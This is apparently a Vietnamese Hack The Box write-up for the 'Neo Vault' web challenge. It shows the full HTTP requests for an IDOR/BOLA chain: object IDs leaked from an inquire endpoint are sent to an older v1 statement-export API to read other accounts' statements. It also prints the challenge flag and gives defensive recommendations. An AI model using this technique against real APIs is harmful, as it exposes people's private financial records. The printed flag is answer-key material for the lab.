---
title: "Neo Vault"
description: "Khai thác IDOR/BOLA trong API xuất sao kê phiên bản cũ để đọc giao dịch của tài khoản khác và lấy flag."
platform: "Hack The Box"
category: "Web"
difficulty: "Easy"
publishedAt: 2026-07-31
tags: ["web", "idor", "bola", "broken-access-control", "api", "version-downgrade"]
language: "vi"
translationKey: "hack-the-box/neo-vault"
draft: false
featured: true
cover: "/images/neo-vault/neo-vault-01.png"
---

> Write-up này được thực hiện trong môi trường lab có kiểm soát. Chỉ áp dụng các kỹ thuật bên dưới trên hệ thống mà bạn được phép kiểm thử.

## Tổng quan

Neo Vault là một ứng dụng ngân hàng có bốn khu vực chính: **Overview**, **Transfer**, **Deposit** và **Transactions**. Mục tiêu là truy cập sao kê của một người dùng khác để tìm flag.

Chuỗi khai thác gồm ba bước:

1. Lấy object ID của tài khoản từ endpoint tra cứu người nhận.
2. Hạ phiên bản endpoint xuất sao kê từ `v2` xuống `v1`.
3. Gửi object ID của người dùng khác đến API cũ, nơi không kiểm tra quyền sở hữu.

![Tổng quan bảng điều khiển Neo Vault](/images/neo-vault/neo-vault-01.png)

## Xác định các tài khoản liên quan

Tài khoản mới nhận khoản thưởng chào mừng `$100` từ `neo_system`. Lịch sử giao dịch hiển thị trực tiếp username của bên gửi, vì vậy `neo_system` là mục tiêu đầu tiên để khảo sát.

![Giao dịch thưởng chào mừng được gửi từ neo_system](/images/neo-vault/neo-vault-02.png)

Trong tab **Transfer**, ứng dụng tra cứu người nhận trước khi tạo giao dịch. Chặn request bằng Burp Suite cho thấy endpoint sau:

```http
GET /api/v2/auth/inquire?username=neo_system HTTP/1.1
Host: <target>
Cookie: token=<session_token>
```

Response tiết lộ cả username lẫn MongoDB-style object ID:

```json
{
  "_id": "<neo_system_id>",
  "username": "neo_system"
}
```

![Endpoint inquire trả về object ID của neo_system](/images/neo-vault/neo-vault-03.png)

Object ID thay đổi theo phiên lab, do đó nên lấy giá trị trực tiếp từ response thay vì sao chép một ID cố định từ ảnh.

## Khảo sát API theo phiên bản

Tab **Deposit** gửi request đến endpoint `v2`:

```http
POST /api/v2/transactions/deposit HTTP/1.1
Host: <target>
Content-Type: application/json
Cookie: token=<session_token>

{
  "amount": 2
}
```

Server trả về thông báo `v2 version is under maintenance`.

![Endpoint deposit phiên bản v2 đang bảo trì](/images/neo-vault/neo-vault-04.png)

Đổi đường dẫn sang `/api/v1/transactions/deposit` chỉ dẫn đến lỗi `Internal server error`, nên nhánh này không cung cấp thêm dữ liệu hữu ích.

![Endpoint deposit phiên bản v1 trả về lỗi nội bộ](/images/neo-vault/neo-vault-05.png)

## Phát hiện endpoint xuất sao kê cũ

Trong tab **Transactions**, chức năng tải giao dịch gọi endpoint sau với body rỗng:

```http
POST /api/v2/transactions/download-transactions HTTP/1.1
Host: <target>
Content-Type: application/json
Cookie: token=<session_token>

{}
```

![Request xuất giao dịch mặc định sử dụng API v2](/images/neo-vault/neo-vault-06.png)

Thay `v2` bằng `v1` làm server trả về thông báo `_id is not provided`. Dù response mang trạng thái `404 Not Found`, thông báo này xác nhận endpoint cũ vẫn tồn tại và nhận trường `_id` từ client.

![API v1 tiết lộ rằng request còn thiếu trường _id](/images/neo-vault/neo-vault-07.png)

## Khai thác IDOR/BOLA

Gửi lại request `v1` với object ID đã lấy của `neo_system`:

```http
POST /api/v1/transactions/download-transactions HTTP/1.1
Host: <target>
Content-Type: application/json
Cookie: token=<session_token>

{
  "_id": "<neo_system_id>"
}
```

![Gửi object ID của neo_system đến endpoint xuất sao kê v1](/images/neo-vault/neo-vault-08.png)

Server trả về một file PDF chứa sao kê của `neo_system`, mặc dù session hiện tại không thuộc tài khoản này. Đây là bằng chứng endpoint tin tưởng object ID do client cung cấp mà không kiểm tra người dùng đang đăng nhập có quyền đọc đối tượng hay không.

Sao kê còn tiết lộ một giao dịch đến tài khoản `user_with_flag`.

![Sao kê của neo_system tiết lộ tài khoản user_with_flag](/images/neo-vault/neo-vault-09.png)

Tiếp tục dùng endpoint `inquire` để lấy ID của tài khoản mới:

```http
GET /api/v2/auth/inquire?username=user_with_flag HTTP/1.1
Host: <target>
Cookie: token=<session_token>
```

```json
{
  "_id": "<user_with_flag_id>",
  "username": "user_with_flag"
}
```

![Endpoint inquire trả về object ID của user_with_flag](/images/neo-vault/neo-vault-10.png)

Thay body của request xuất sao kê bằng ID vừa thu được:

```http
POST /api/v1/transactions/download-transactions HTTP/1.1
Host: <target>
Content-Type: application/json
Cookie: token=<session_token>

{
  "_id": "<user_with_flag_id>"
}
```

![Yêu cầu tải sao kê của user_with_flag qua API v1](/images/neo-vault/neo-vault-11.png)

File PDF trả về chứa flag trong phần mô tả giao dịch:

```text
HTB{n0t_s0_3asy_1d0r}
```

![Sao kê của user_with_flag chứa flag](/images/neo-vault/neo-vault-12.png)

## Nguyên nhân gốc

Lỗ hổng chính là **Broken Object Level Authorization (BOLA)**, thường được gọi là **IDOR** trong ứng dụng web:

- Endpoint `v1` chọn tài khoản cần xuất sao kê hoàn toàn từ trường `_id` do client gửi.
- Backend không ràng buộc `_id` với danh tính trong session và không kiểm tra quyền sở hữu trước khi trả file.
- Endpoint `inquire` giúp chuyển một username đã biết thành object ID, làm việc khai thác trở nên trực tiếp.
- Phiên bản API cũ vẫn có thể truy cập dù giao diện mặc định sử dụng `v2`, tạo ra một bề mặt tấn công bị bỏ quên.

Việc dùng ID dài hoặc khó đoán không phải là biện pháp kiểm soát truy cập. Khi một endpoint khác làm lộ ID, toàn bộ cơ chế bảo vệ dựa trên tính bí mật của ID sẽ mất tác dụng.

## Khuyến nghị phòng thủ

- Xác thực quyền trên từng đối tượng ở phía server trước khi tạo hoặc trả sao kê.
- Với người dùng thông thường, lấy account ID từ session; không nhận account ID tùy ý từ request body.
- Nếu cần hỗ trợ quản trị viên, kiểm tra vai trò và phạm vi truy cập rõ ràng cho mỗi yêu cầu.
- Vô hiệu hóa hoàn toàn các phiên bản API cũ và kiểm tra từ bên ngoài rằng route không còn truy cập được.
- Áp dụng cùng một middleware xác thực và phân quyền cho mọi phiên bản API.
- Bổ sung test cho truy cập chéo tài khoản, thay object ID và gọi trực tiếp endpoint phiên bản cũ.

## Tổng kết

Neo Vault minh họa một lỗi phân quyền nhỏ nhưng có tác động trực tiếp đến dữ liệu nhạy cảm. Endpoint `inquire` cung cấp object ID, còn endpoint xuất sao kê `v1` sử dụng ID đó mà không xác minh quyền sở hữu. Kết hợp hai hành vi này cho phép đọc lần lượt sao kê của `neo_system` và `user_with_flag` để lấy flag.
